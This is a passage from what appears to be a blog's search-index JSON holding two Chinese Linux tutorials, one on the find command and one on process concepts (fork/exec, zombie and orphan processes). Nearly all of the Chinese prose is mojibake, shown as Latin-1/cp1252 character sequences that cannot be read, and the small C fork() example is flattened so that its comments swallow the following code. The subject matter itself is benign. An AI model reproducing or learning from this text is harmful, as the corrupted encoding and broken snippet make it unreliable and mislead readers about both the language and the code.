¹æ®æ–‡ä»¶çš„å±æ€§ï¼ˆå¦‚æ–‡ä»¶çš„æ—¶é—´æˆ³ï¼Œæ–‡ä»¶çš„æƒé™ç­‰ï¼‰è¿›è¡Œæœç´¢ã€‚find å‘½ä»¤å¼ºå¤§åˆ°ï¼Œè¦æŠŠå®ƒè®²æ˜ç™½è‡³å°‘éœ€è¦å•ç‹¬å¥½å‡ èŠ‚è¯¾ç¨‹æ‰è¡Œï¼Œæˆ‘ä»¬è¿™é‡Œåªä»‹ç»ä¸€äº›å¸¸ç”¨çš„å†…å®¹ã€‚ è¿™æ¡å‘½ä»¤è¡¨ç¤ºå» /etc/ ç›®å½•ä¸‹é¢ ï¼Œæœç´¢åå­—å«åš interfaces çš„æ–‡ä»¶æˆ–è€…ç›®å½•ã€‚è¿™æ˜¯ find å‘½ä»¤æœ€å¸¸è§çš„æ ¼å¼ï¼Œåƒä¸‡è®°ä½ find çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦æœç´¢çš„åœ°æ–¹ã€‚å‘½ä»¤å‰é¢åŠ ä¸Š sudo æ˜¯å› ä¸º shiyanlou åªæ˜¯æ™®é€šç”¨æˆ·ï¼Œå¯¹ /etc ç›®å½•ä¸‹çš„å¾ˆå¤šæ–‡ä»¶éƒ½æ²¡æœ‰è®¿é—®çš„æƒé™ï¼Œå¦‚æœæ˜¯ root ç”¨æˆ·åˆ™ä¸ç”¨ä½¿ç”¨ã€‚ 1sudo find /etc/ -name interfaces æ³¨æ„ find å‘½ä»¤çš„è·¯å¾„æ˜¯ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°çš„ï¼Œ åŸºæœ¬å‘½ä»¤æ ¼å¼ä¸º find [path][option] [action] ã€‚ ä¸æ—¶é—´ç›¸å…³çš„å‘½ä»¤å‚æ•°ï¼š å‚æ•° è¯´æ˜ -atime æœ€åè®¿é—®æ—¶é—´ -ctime æœ€åä¿®æ”¹æ–‡ä»¶å†…å®¹çš„æ—¶é—´ -mtime æœ€åä¿®æ”¹æ–‡ä»¶å±æ€§çš„æ—¶é—´ ä¸‹é¢ä»¥ -mtime å‚æ•°ä¸¾ä¾‹ï¼š -mtime nï¼šn ä¸ºæ•°å­—ï¼Œè¡¨ç¤ºä¸ºåœ¨ n å¤©ä¹‹å‰çš„â€œä¸€å¤©ä¹‹å†…â€ä¿®æ”¹è¿‡çš„æ–‡ä»¶ -mtime +nï¼šåˆ—å‡ºåœ¨ n å¤©ä¹‹å‰ï¼ˆä¸åŒ…å« n å¤©æœ¬èº«ï¼‰è¢«ä¿®æ”¹è¿‡çš„æ–‡ä»¶ -mtime -nï¼šåˆ—å‡ºåœ¨ n å¤©ä¹‹å†…ï¼ˆåŒ…å« n å¤©æœ¬èº«ï¼‰è¢«ä¿®æ”¹è¿‡çš„æ–‡ä»¶ -newer fileï¼šfile ä¸ºä¸€ä¸ªå·²å­˜åœ¨çš„æ–‡ä»¶ï¼Œåˆ—å‡ºæ¯” file è¿˜è¦æ–°çš„æ–‡ä»¶å åˆ—å‡º home ç›®å½•ä¸­ï¼Œå½“å¤©ï¼ˆ24 å°æ—¶ä¹‹å†…ï¼‰æœ‰æ”¹åŠ¨çš„æ–‡ä»¶ï¼š 1find ~ -mtime 0 åˆ—å‡ºç”¨æˆ·å®¶ç›®å½•ä¸‹æ¯” /etc ç›®å½•æ–°çš„æ–‡ä»¶ï¼š 1find ~ -newer /etc","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"LinuxåŸºç¡€å…¥é—¨","slug":"A-OS/Linux/LinuxåŸºç¡€å…¥é—¨","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"LinuxåŸºç¡€å…¥é—¨15 Linuxè¿›ç¨‹æ¦‚å¿µ","date":"2023-10-27T01:24:01.843Z","path":"A_OS/Linux/LinuxåŸºç¡€å…¥é—¨/15 Linux è¿›ç¨‹æ¦‚å¿µ/","text":"Linux è¿›ç¨‹æ¦‚å¿µ [toc] 1 æ¦‚å¿µçš„ç†è§£ é¦–å…ˆç¨‹åºä¸è¿›ç¨‹æ˜¯ä»€ä¹ˆï¼Ÿç¨‹åºä¸è¿›ç¨‹åˆæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ ç¨‹åºï¼ˆprocedureï¼‰ï¼šä¸å¤ªç²¾ç¡®åœ°è¯´ï¼Œç¨‹åºå°±æ˜¯æ‰§è¡Œä¸€ç³»åˆ—æœ‰é€»è¾‘ã€æœ‰é¡ºåºç»“æ„çš„æŒ‡ä»¤ï¼Œå¸®æˆ‘ä»¬è¾¾æˆæŸä¸ªç»“æœã€‚å°±å¦‚æˆ‘ä»¬å»é¤é¦†ï¼Œç»™æœåŠ¡å‘˜è¯´æˆ‘è¦ç‰›è‚‰ç›–æµ‡é¥­ï¼Œå¥¹æ‰§è¡Œäº†åšç‰›è‚‰ç›–æµ‡é¥­è¿™ä¹ˆä¸€ä¸ªç¨‹åºï¼Œæœ€åæˆ‘ä»¬å¾—åˆ°äº†è¿™ä¹ˆä¸€ç›˜ç‰›è‚‰ç›–æµ‡é¥­ã€‚å®ƒéœ€è¦å»æ‰§è¡Œï¼Œä¸ç„¶å®ƒå°±åƒä¸€æœ¬æ­¦åŠŸç§˜ç±ï¼Œæ”¾åœ¨é‚£é‡Œç­‰äººç¿»çœ‹ã€‚ è¿›ç¨‹ï¼ˆprocessï¼‰ï¼šè¿›ç¨‹æ˜¯ç¨‹åºåœ¨ä¸€ä¸ªæ•°æ®é›†åˆä¸Šçš„ä¸€æ¬¡æ‰§è¡Œè¿‡ç¨‹ï¼Œåœ¨æ—©æœŸçš„ UNIXã€Linux 2.4 åŠæ›´æ—©çš„ç‰ˆæœ¬ä¸­ï¼Œå®ƒæ˜¯ç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…å’Œè°ƒåº¦çš„ç‹¬ç«‹åŸºæœ¬å•ä½ã€‚åŒä¸Šä¸€ä¸ªä¾‹å­ï¼Œå°±å¦‚æˆ‘ä»¬å»äº†é¤é¦†ï¼Œç»™æœåŠ¡å‘˜è¯´æˆ‘è¦ç‰›è‚‰ç›–æµ‡é¥­ï¼Œå¥¹æ‰§è¡Œäº†åšç‰›è‚‰ç›–æµ‡é¥­è¿™ä¹ˆä¸€ä¸ªç¨‹åºï¼Œè€Œé‡Œé¢åšé¥­çš„æ˜¯ä¸€ä¸ªè¿›ç¨‹ï¼Œåšç‰›è‚‰æ±¤æ±çš„æ˜¯ä¸€ä¸ªè¿›ç¨‹ï¼ŒæŠŠç‰›è‚‰æ±¤æ±ä¸é¥­æ··åˆåœ¨ä¸€èµ·çš„æ˜¯ä¸€ä¸ªè¿›ç¨‹ï¼ŒæŠŠé¥­ç«¯ä¸Šæ¡Œçš„æ˜¯ä¸€ä¸ªè¿›ç¨‹ã€‚å®ƒå°±åƒæ˜¯æˆ‘ä»¬åœ¨çœ‹æ­¦åŠŸç§˜ç±è¿™ä¹ˆä¸€ä¸ªè¿‡ç¨‹ï¼Œç„¶åä¸€ä¸ªç¯‡ç« ä¸€ä¸ªç¯‡ç« åœ°å»ç»ƒã€‚ ç®€å•æ¥è¯´ï¼Œç¨‹åºæ˜¯ä¸ºäº†å®ŒæˆæŸç§ä»»åŠ¡è€Œè®¾è®¡çš„è½¯ä»¶ï¼Œæ¯”å¦‚ vim æ˜¯ç¨‹åºã€‚ä»€ä¹ˆæ˜¯è¿›ç¨‹å‘¢ï¼Ÿè¿›ç¨‹å°±æ˜¯è¿è¡Œä¸­çš„ç¨‹åºã€‚ ç¨‹åºåªæ˜¯ä¸€äº›åˆ—æŒ‡ä»¤çš„é›†åˆï¼Œæ˜¯ä¸€ä¸ªé™æ­¢çš„å®ä½“ï¼Œè€Œè¿›ç¨‹ä¸åŒï¼Œè¿›ç¨‹æœ‰ä»¥ä¸‹çš„ç‰¹æ€§ï¼š åŠ¨æ€æ€§ï¼šè¿›ç¨‹çš„å®è´¨æ˜¯ä¸€æ¬¡ç¨‹åºæ‰§è¡Œçš„è¿‡ç¨‹ï¼Œæœ‰åˆ›å»ºã€æ’¤é”€ç­‰çŠ¶æ€çš„å˜åŒ–ã€‚è€Œç¨‹åºæ˜¯ä¸€ä¸ªé™æ€çš„å®ä½“ã€‚ å¹¶å‘æ€§ï¼šè¿›ç¨‹å¯ä»¥åšåˆ°åœ¨ä¸€ä¸ªæ—¶é—´æ®µå†…ï¼Œæœ‰å¤šä¸ªç¨‹åºåœ¨è¿è¡Œä¸­ã€‚ç¨‹åºåªæ˜¯é™æ€çš„å®ä½“ï¼Œæ‰€ä»¥ä¸å­˜åœ¨å¹¶å‘æ€§ã€‚ ç‹¬ç«‹æ€§ï¼šè¿›ç¨‹å¯ä»¥ç‹¬ç«‹åˆ†é…èµ„æºï¼Œç‹¬ç«‹æ¥å—è°ƒåº¦ï¼Œç‹¬ç«‹åœ°è¿è¡Œã€‚ å¼‚æ­¥æ€§ï¼šè¿›ç¨‹ä»¥ä¸å¯é¢„çŸ¥çš„é€Ÿåº¦å‘å‰æ¨è¿›ã€‚ ç»“æ„æ€§ï¼šè¿›ç¨‹æ‹¥æœ‰ä»£ç æ®µã€æ•°æ®æ®µã€PCBï¼ˆè¿›ç¨‹æ§åˆ¶å—ï¼Œè¿›ç¨‹å­˜åœ¨çš„å”¯ä¸€æ ‡å¿—ï¼‰ã€‚ä¹Ÿæ­£æ˜¯å› ä¸ºæœ‰ç»“æ„æ€§ï¼Œè¿›ç¨‹æ‰å¯ä»¥åšåˆ°ç‹¬ç«‹åœ°è¿è¡Œã€‚ **å¹¶å‘ï¼š**åœ¨ä¸€ä¸ªæ—¶é—´æ®µå†…ï¼Œå®è§‚æ¥çœ‹æœ‰å¤šä¸ªç¨‹åºéƒ½åœ¨æ´»åŠ¨ï¼Œæœ‰æ¡ä¸ç´Šçš„æ‰§è¡Œï¼ˆæ¯ä¸€ç¬é—´åªæœ‰ä¸€ä¸ªåœ¨æ‰§è¡Œï¼Œåªæ˜¯åœ¨ä¸€æ®µæ—¶é—´æœ‰å¤šä¸ªç¨‹åºéƒ½æ‰§è¡Œè¿‡ï¼‰ **å¹¶è¡Œï¼š**åœ¨æ¯ä¸€ä¸ªç¬é—´ï¼Œéƒ½æœ‰å¤šä¸ªç¨‹åºéƒ½åœ¨åŒæ—¶æ‰§è¡Œï¼Œè¿™ä¸ªå¿…é¡»æœ‰å¤šä¸ª CPU æ‰è¡Œ å¼•å…¥è¿›ç¨‹æ˜¯å› ä¸ºä¼ ç»Ÿæ„ä¹‰ä¸Šçš„ç¨‹åºå·²ç»ä¸è¶³ä»¥æè¿° OS ä¸­å„ç§æ´»åŠ¨ä¹‹é—´çš„åŠ¨æ€æ€§ã€å¹¶å‘æ€§ã€ç‹¬ç«‹æ€§è¿˜æœ‰ç›¸äº’åˆ¶çº¦æ€§ã€‚ç¨‹åºå°±åƒä¸€ä¸ªå…¬å¸ï¼Œåªæ˜¯ä¸€äº›è¯ä¹¦ï¼Œæ–‡ä»¶çš„å †ç§¯ï¼ˆé™æ€å®ä½“ï¼‰ã€‚è€Œå½“å…¬å¸è¿ä½œèµ·æ¥å°±æœ‰å„ä¸ªéƒ¨é—¨çš„åŒºåˆ†ï¼Œè´¢åŠ¡éƒ¨ï¼ŒæŠ€æœ¯éƒ¨ï¼Œé”€å”®éƒ¨ç­‰ç­‰ï¼Œå°±åƒå„ä¸ªè¿›ç¨‹ï¼Œå„ä¸ªéƒ¨é—¨ä¹‹é—´å¯ä»¥ç‹¬ç«‹è¿ä½œï¼Œä¹Ÿå¯ä»¥æœ‰äº¤äº’ï¼ˆç‹¬ç«‹æ€§ã€å¹¶å‘æ€§ï¼‰ã€‚ è€Œéšç€ç¨‹åºçš„å‘å±•è¶Šåšè¶Šå¤§ï¼Œåˆä¼šç»§ç»­ç»†åˆ†ï¼Œä»è€Œå¼•å…¥äº†çº¿ç¨‹çš„æ¦‚å¿µï¼Œå½“ä»£å¤šæ•°æ“ä½œç³»ç»Ÿã€Linux 2.6 åŠæ›´æ–°çš„ç‰ˆæœ¬ä¸­ï¼Œè¿›ç¨‹æœ¬èº«ä¸æ˜¯åŸºæœ¬è¿è¡Œå•ä½ï¼Œè€Œæ˜¯çº¿ç¨‹çš„å®¹å™¨ã€‚å°±åƒä¸Šè¿°æ‰€è¯´çš„ï¼Œæ¯ä¸ªéƒ¨é—¨åˆä¼šç»†åˆ†ä¸ºå„ä¸ªå·¥ä½œå°ç»„ï¼ˆçº¿ç¨‹ï¼‰ï¼Œè€Œå·¥ä½œå°ç»„éœ€è¦çš„èµ„æºéœ€è¦å‘ä¸Šçº§ï¼ˆè¿›ç¨‹ï¼‰ç”³è¯·ã€‚ çº¿ç¨‹ï¼ˆthreadï¼‰æ˜¯æ“ä½œç³»ç»Ÿèƒ½å¤Ÿè¿›è¡Œè¿ç®—è°ƒåº¦çš„æœ€å°å•ä½ã€‚å®ƒè¢«åŒ…å«åœ¨è¿›ç¨‹ä¹‹ä¸­ï¼Œæ˜¯è¿›ç¨‹ä¸­çš„å®é™…è¿ä½œå•ä½ã€‚ä¸€æ¡çº¿ç¨‹æŒ‡çš„æ˜¯è¿›ç¨‹ä¸­ä¸€ä¸ªå•ä¸€é¡ºåºçš„æ§åˆ¶æµï¼Œä¸€ä¸ªè¿›ç¨‹ä¸­å¯ä»¥å¹¶å‘å¤šä¸ªçº¿ç¨‹ï¼Œæ¯æ¡çº¿ç¨‹å¹¶è¡Œæ‰§è¡Œä¸åŒçš„ä»»åŠ¡ã€‚å› ä¸ºçº¿ç¨‹ä¸­å‡ ä¹ä¸åŒ…å«ç³»ç»Ÿèµ„æºï¼Œæ‰€ä»¥æ‰§è¡Œæ›´å¿«ã€æ›´æœ‰æ•ˆç‡ã€‚ ç®€è€Œè¨€ä¹‹ï¼Œä¸€ä¸ªç¨‹åºè‡³å°‘æœ‰ä¸€ä¸ªè¿›ç¨‹ï¼Œä¸€ä¸ªè¿›ç¨‹è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹ã€‚çº¿ç¨‹çš„åˆ’åˆ†å°ºåº¦å°äºè¿›ç¨‹ï¼Œä½¿å¾—å¤šçº¿ç¨‹ç¨‹åºçš„å¹¶å‘æ€§é«˜ã€‚å¦å¤–ï¼Œè¿›ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æ‹¥æœ‰ç‹¬ç«‹çš„å†…å­˜å•å…ƒï¼Œè€Œå¤šä¸ªçº¿ç¨‹å…±äº«å†…å­˜ï¼Œä»è€Œæå¤§åœ°æé«˜äº†ç¨‹åºçš„è¿è¡Œæ•ˆç‡ã€‚ 2 è¿›ç¨‹çš„å±æ€§ 2.1 è¿›ç¨‹çš„åˆ†ç±» å¤§æ¦‚æ˜ç™½è¿›ç¨‹æ˜¯ä¸ªä»€ä¹ˆæ ·çš„å­˜åœ¨åï¼Œæˆ‘ä»¬éœ€è¦è¿›ä¸€æ­¥äº†è§£çš„å°±æ˜¯è¿›ç¨‹åˆ†ç±»ã€‚å¯ä»¥ä»ä¸¤ä¸ªè§’åº¦æ¥åˆ†ï¼š ä»¥è¿›ç¨‹çš„åŠŸèƒ½ä¸æœåŠ¡çš„å¯¹è±¡æ¥åˆ†ï¼› ä»¥åº”ç”¨ç¨‹åºçš„æœåŠ¡ç±»å‹æ¥åˆ†ï¼› ç¬¬ä¸€ä¸ªè§’åº¦æ¥çœ‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ†ä¸ºç”¨æˆ·è¿›ç¨‹ä¸ç³»ç»Ÿè¿›ç¨‹ï¼š ç”¨æˆ·è¿›ç¨‹ï¼šé€šè¿‡æ‰§è¡Œç”¨æˆ·ç¨‹åºã€åº”ç”¨ç¨‹åºæˆ–ç§°ä¹‹ä¸ºå†…æ ¸ä¹‹å¤–çš„ç³»ç»Ÿç¨‹åºè€Œäº§ç”Ÿçš„è¿›ç¨‹ï¼Œæ­¤ç±»è¿›ç¨‹å¯ä»¥åœ¨ç”¨æˆ·çš„æ§åˆ¶ä¸‹è¿è¡Œæˆ–å…³é—­ã€‚ ç³»ç»Ÿè¿›ç¨‹ï¼šé€šè¿‡æ‰§è¡Œç³»ç»Ÿå†…æ ¸ç¨‹åºè€Œäº§ç”Ÿçš„è¿›ç¨‹ï¼Œæ¯”å¦‚å¯ä»¥æ‰§è¡Œå†…å­˜èµ„æºåˆ†é…å’Œè¿›ç¨‹åˆ‡æ¢ç­‰ç›¸å¯¹åº•å±‚çš„å·¥ä½œï¼›è€Œä¸”è¯¥è¿›ç¨‹çš„è¿è¡Œä¸å—ç”¨æˆ·çš„å¹²é¢„ï¼Œå³ä½¿æ˜¯ root ç”¨æˆ·ä¹Ÿä¸èƒ½å¹²é¢„ç³»ç»Ÿè¿›ç¨‹çš„è¿è¡Œã€‚ ç¬¬äºŒè§’åº¦æ¥çœ‹ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿›ç¨‹åˆ†ä¸ºäº¤äº’è¿›ç¨‹ã€æ‰¹å¤„ç†è¿›ç¨‹ã€å®ˆæŠ¤è¿›ç¨‹ï¼š äº¤äº’è¿›ç¨‹ï¼šç”±ä¸€ä¸ª shell ç»ˆç«¯å¯åŠ¨çš„è¿›ç¨‹ï¼Œåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œéœ€è¦ä¸ç”¨æˆ·è¿›è¡Œäº¤äº’æ“ä½œï¼Œå¯ä»¥è¿è¡Œäºå‰å°ï¼Œä¹Ÿå¯ä»¥è¿è¡Œåœ¨åå°ã€‚ æ‰¹å¤„ç†è¿›ç¨‹ï¼šè¯¥è¿›ç¨‹æ˜¯ä¸€ä¸ªè¿›ç¨‹é›†åˆï¼Œè´Ÿè´£æŒ‰é¡ºåºå¯åŠ¨å…¶ä»–çš„è¿›ç¨‹ã€‚ å®ˆæŠ¤è¿›ç¨‹ï¼šå®ˆæŠ¤è¿›ç¨‹æ˜¯ä¸€ç›´è¿è¡Œçš„ä¸€ç§è¿›ç¨‹ï¼Œåœ¨ Linux ç³»ç»Ÿå¯åŠ¨æ—¶å¯åŠ¨ï¼Œåœ¨ç³»ç»Ÿå…³é—­æ—¶ç»ˆæ­¢ã€‚å®ƒä»¬ç‹¬ç«‹äºæ§åˆ¶ç»ˆç«¯å¹¶ä¸”å‘¨æœŸæ€§çš„æ‰§è¡ŒæŸç§ä»»åŠ¡æˆ–ç­‰å¾…å¤„ç†æŸäº›å‘ç”Ÿçš„äº‹ä»¶ã€‚ä¾‹å¦‚ httpd è¿›ç¨‹ï¼Œä¸€ç›´å¤„äºè¿è¡ŒçŠ¶æ€ï¼Œç­‰å¾…ç”¨æˆ·çš„è®¿é—®ã€‚è¿˜æœ‰ç»å¸¸ç”¨çš„ cronï¼ˆåœ¨ centOS ç³»åˆ—ä¸º crondï¼‰è¿›ç¨‹ï¼Œè¿™ä¸ªè¿›ç¨‹ä¸º crontab çš„å®ˆæŠ¤è¿›ç¨‹ï¼Œå¯ä»¥å‘¨æœŸæ€§çš„æ‰§è¡Œç”¨æˆ·è®¾å®šçš„æŸäº›ä»»åŠ¡ã€‚ 2.2 è¿›ç¨‹çš„è¡ç”Ÿ è¿›ç¨‹æœ‰è¿™ä¹ˆå¤šçš„ç§ç±»ï¼Œé‚£ä¹ˆè¿›ç¨‹ä¹‹é—´å®šæ˜¯æœ‰ç›¸å…³æ€§çš„ï¼Œè€Œè¿™äº›æœ‰å…³è”æ€§çš„è¿›ç¨‹åˆæ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Œå¦‚ä½•è¡ç”Ÿçš„ï¼Ÿ å°±æ¯”å¦‚æˆ‘ä»¬å¯åŠ¨äº†ç»ˆç«¯ï¼Œå°±æ˜¯å¯åŠ¨äº†ä¸€ä¸ª bash è¿›ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ bash ä¸­å†è¾“å…¥ bash åˆ™ä¼šå†å¯åŠ¨ä¸€ä¸ª bash çš„è¿›ç¨‹ï¼Œæ­¤æ—¶ç¬¬äºŒä¸ª bash è¿›ç¨‹å°±æ˜¯ç”±ç¬¬ä¸€ä¸ª bash è¿›ç¨‹åˆ›å»ºå‡ºæ¥çš„ï¼Œä»–ä»¬ä¹‹é—´åˆæ˜¯ä¸ªä»€ä¹ˆå…³ç³»ï¼Ÿ æˆ‘ä»¬ä¸€èˆ¬ç§°å‘¼ç¬¬ä¸€ä¸ª bash è¿›ç¨‹æ˜¯ç¬¬äºŒ bash è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ï¼Œç¬¬äºŒ bash è¿›ç¨‹æ˜¯ç¬¬ä¸€ä¸ª bash è¿›ç¨‹çš„å­è¿›ç¨‹ï¼Œè¿™å±‚å…³ç³»æ˜¯å¦‚ä½•å¾—æ¥çš„å‘¢ï¼Ÿ å…³äºçˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹ä¾¿ä¼šæåŠè¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ fork() ä¸ exec() fork-execæ˜¯ç”± Dennis M. Ritchie åˆ›é€ çš„ fork() æ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼ˆsystem callï¼‰ï¼Œå®ƒçš„ä¸»è¦ä½œç”¨å°±æ˜¯ä¸ºå½“å‰çš„è¿›ç¨‹åˆ›å»ºä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼Œè¿™ä¸ªæ–°çš„è¿›ç¨‹å°±æ˜¯å®ƒçš„å­è¿›ç¨‹ï¼Œè¿™ä¸ªå­è¿›ç¨‹é™¤äº†çˆ¶è¿›ç¨‹çš„è¿”å›å€¼å’Œ PID ä»¥å¤–å…¶ä»–çš„éƒ½ä¸€æ¨¡ä¸€æ ·ï¼Œå¦‚è¿›ç¨‹çš„æ‰§è¡Œä»£ç æ®µï¼Œå†…å­˜ä¿¡æ¯ï¼Œæ–‡ä»¶æè¿°ï¼Œå¯„å­˜å™¨çŠ¶æ€ç­‰ç­‰ exec() ä¹Ÿæ˜¯ç³»ç»Ÿè°ƒç”¨ï¼Œä½œç”¨æ˜¯åˆ‡æ¢å­è¿›ç¨‹ä¸­çš„æ‰§è¡Œç¨‹åºä¹Ÿå°±æ˜¯æ›¿æ¢å…¶ä»çˆ¶è¿›ç¨‹å¤åˆ¶è¿‡æ¥çš„ä»£ç æ®µä¸æ•°æ®æ®µ å­è¿›ç¨‹å°±æ˜¯çˆ¶è¿›ç¨‹é€šè¿‡ç³»ç»Ÿè°ƒç”¨ fork() è€Œäº§ç”Ÿçš„å¤åˆ¶å“ï¼Œfork() å°±æ˜¯æŠŠçˆ¶è¿›ç¨‹çš„ PCB ç­‰è¿›ç¨‹çš„æ•°æ®ç»“æ„ä¿¡æ¯ç›´æ¥å¤åˆ¶è¿‡æ¥ï¼Œåªæ˜¯ä¿®æ”¹äº† PIDï¼Œæ‰€ä»¥ä¸€æ¨¡ä¸€æ ·ï¼Œåªæœ‰åœ¨æ‰§è¡Œ exec() ä¹‹åæ‰ä¼šä¸åŒï¼Œè€Œæ—©å…ˆçš„ fork() æ¯”è¾ƒæ¶ˆè€—èµ„æºåæ¥è¿›åŒ–æˆ vfork()ï¼Œæ•ˆç‡é«˜äº†ä¸å°‘ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥æŸ¥æŸ¥ä¸ºä»€ä¹ˆã€‚ è¿™å°±æ˜¯å­è¿›ç¨‹äº§ç”Ÿçš„ç”±æ¥ã€‚ç®€å•çš„å®ç°é€»è¾‘å°±å¦‚ä¸‹æ–¹æ‰€ç¤ºï¼š 123456789pid_t p;p = fork();if (p == (pid_t) -1) /* ERROR */else if (p == 0) /* CHILD */else /* PARENT */ æ—¢ç„¶å­è¿›ç¨‹æ˜¯é€šè¿‡çˆ¶è¿›ç¨‹è€Œè¡ç”Ÿå‡ºæ¥çš„ï¼Œé‚£ä¹ˆå­è¿›ç¨‹çš„é€€å‡ºä¸èµ„æºçš„å›æ”¶å®šç„¶ä¸çˆ¶è¿›ç¨‹æœ‰å¾ˆå¤§çš„ç›¸å…³æ€§ã€‚å½“ä¸€ä¸ªå­è¿›ç¨‹è¦æ­£å¸¸çš„ç»ˆæ­¢è¿è¡Œæ—¶ï¼Œæˆ–è€…è¯¥è¿›ç¨‹ç»“æŸæ—¶å®ƒçš„ä¸»å‡½æ•° main() ä¼šæ‰§è¡Œ exit(n); æˆ–è€… return nï¼Œè¿™é‡Œçš„è¿”å›å€¼ n æ˜¯ä¸€ä¸ªä¿¡å·ï¼Œç³»ç»Ÿä¼šæŠŠè¿™ä¸ª SIGCHLD ä¿¡å·ä¼ ç»™å…¶çˆ¶è¿›ç¨‹ï¼Œå½“ç„¶è‹¥æ˜¯å¼‚å¸¸ç»ˆæ­¢ä¹Ÿå¾€å¾€æ˜¯å› ä¸ºè¿™ä¸ªä¿¡å·ã€‚ åœ¨å°†è¦ç»“æŸæ—¶çš„å­è¿›ç¨‹ä»£ç æ‰§è¡Œéƒ¨åˆ†å·²ç»ç»“æŸæ‰§è¡Œäº†ï¼Œç³»ç»Ÿçš„èµ„æºä¹ŸåŸºæœ¬å½’è¿˜ç»™ç³»ç»Ÿäº†ï¼Œä½†è‹¥æ˜¯å…¶è¿›ç¨‹çš„è¿›ç¨‹æ§åˆ¶å—ï¼ˆPCBï¼‰ä»é©»ç•™åœ¨å†…å­˜ä¸­ï¼Œè€Œå®ƒçš„ PCB è¿˜åœ¨ï¼Œä»£è¡¨è¿™ä¸ªè¿›ç¨‹è¿˜å­˜åœ¨ï¼ˆå› ä¸º PCB å°±æ˜¯è¿›ç¨‹å­˜åœ¨çš„å”¯ä¸€æ ‡å¿—ï¼Œé‡Œé¢æœ‰ PID ç­‰æ¶ˆæ¯ï¼‰ï¼Œå¹¶æ²¡æœ‰æ¶ˆäº¡ï¼Œè¿™æ ·çš„è¿›ç¨‹ç§°ä¹‹ä¸ºåƒµå°¸è¿›ç¨‹ï¼ˆZombieï¼‰ã€‚ å¦‚å›¾ä¸­ç¬¬å››åˆ—æ ‡é¢˜æ˜¯ Sï¼ŒS è¡¨ç¤ºçš„æ˜¯è¿›ç¨‹çš„çŠ¶æ€ï¼Œè€Œåœ¨ä¸‹å±çš„ç¬¬ä¸‰è¡Œçš„ Z è¡¨ç¤ºçš„æ˜¯ Zombie çš„æ„æ€ã€‚ï¼ˆ ps å‘½ä»¤å°†åœ¨åç»­è¯¦è§£ï¼‰ æ­£å¸¸æƒ…å†µä¸‹ï¼Œçˆ¶è¿›ç¨‹ä¼šæ”¶åˆ°ä¸¤ä¸ªè¿”å›å€¼ï¼šexit codeï¼ˆSIGCHLD ä¿¡å·ï¼‰ä¸ reason for termination ã€‚ä¹‹åï¼Œçˆ¶è¿›ç¨‹ä¼šä½¿ç”¨ wait(&amp;status) ç³»ç»Ÿè°ƒç”¨ä»¥è·å–å­è¿›ç¨‹çš„é€€å‡ºçŠ¶æ€ï¼Œç„¶åå†…æ ¸å°±å¯ä»¥ä»å†…å­˜ä¸­é‡Šæ”¾å·²ç»“æŸçš„å­è¿›ç¨‹çš„ PCBï¼›è€Œå¦‚è‹¥çˆ¶è¿›ç¨‹æ²¡æœ‰è¿™ä¹ˆåšçš„è¯ï¼Œå­è¿›ç¨‹çš„ PCB å°±ä¼šä¸€ç›´é©»ç•™åœ¨å†…å­˜ä¸­ï¼Œä¸€ç›´ç•™åœ¨ç³»ç»Ÿä¸­æˆä¸ºåƒµå°¸è¿›ç¨‹ï¼ˆZombieï¼‰ã€‚ è™½ç„¶åƒµå°¸è¿›ç¨‹æ˜¯å·²ç»æ”¾å¼ƒäº†å‡ ä¹æ‰€æœ‰å†…å­˜ç©ºé—´ï¼Œæ²¡æœ‰ä»»ä½•å¯æ‰§è¡Œä»£ç ï¼Œä¹Ÿä¸èƒ½è¢«è°ƒåº¦ï¼Œåœ¨è¿›ç¨‹åˆ—è¡¨ä¸­ä¿ç•™ä¸€ä¸ªä½ç½®ï¼Œè®°è½½è¯¥è¿›ç¨‹çš„é€€å‡ºçŠ¶æ€ç­‰ä¿¡æ¯ä¾›å…¶çˆ¶è¿›ç¨‹æ”¶é›†ï¼Œä»è€Œé‡Šæ”¾å®ƒã€‚ä½†æ˜¯ Linux ç³»ç»Ÿä¸­èƒ½ä½¿ç”¨çš„ PID æ˜¯æœ‰é™çš„ï¼Œå¦‚æœç³»ç»Ÿä¸­å­˜åœ¨æœ‰å¤§é‡çš„åƒµå°¸è¿›ç¨‹ï¼Œç³»ç»Ÿå°†ä¼šå› ä¸ºæ²¡æœ‰å¯ç”¨çš„ PID ä»è€Œå¯¼è‡´ä¸èƒ½äº§ç”Ÿæ–°çš„è¿›ç¨‹ã€‚ å¦å¤–å¦‚æœçˆ¶è¿›ç¨‹ç»“æŸï¼ˆéæ­£å¸¸çš„ç»“æŸï¼‰ï¼Œæœªèƒ½åŠæ—¶æ”¶å›å­è¿›ç¨‹ï¼Œå­è¿›ç¨‹ä»åœ¨è¿è¡Œï¼Œè¿™æ ·çš„å­è¿›ç¨‹ç§°ä¹‹ä¸ºå­¤å„¿è¿›ç¨‹ã€‚åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œå­¤å„¿è¿›ç¨‹ä¸€èˆ¬ä¼šè¢« init è¿›ç¨‹æ‰€â€œæ”¶å…»â€ï¼Œæˆä¸º init 